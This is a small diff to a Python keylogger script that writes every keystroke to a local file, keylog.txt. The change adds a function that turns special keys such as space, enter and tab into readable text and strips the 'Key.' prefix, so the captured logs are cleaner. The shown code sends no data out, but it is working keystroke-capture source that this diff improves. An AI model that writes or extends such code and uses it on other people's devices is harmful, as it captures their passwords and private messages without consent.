@@ -6,6 +6,15 @@ file = open('keylog.txt', 'a')
 file.write('Start keylogging\n')
 file.close()
 
+def format_special_key(key):
+    special_keys = {
+        keyboard.Key.space: ' ',
+        keyboard.Key.enter: '\n',
+        keyboard.Key.tab: '\t',
+    }
+    
+    return special_keys.get(key, f'[{str(key)}]')
+
 def on_press(key):
     file = open('keylog.txt', 'a')
     try:
@@ -15,6 +24,8 @@ def on_press(key):
         
     except AttributeError:
         #print(f'special key {key} pressed')
+        key = format_special_key(key)
+        key = str(key).replace('Key.', '')
         file.write(f"{str(key)}")
     file.close()
         
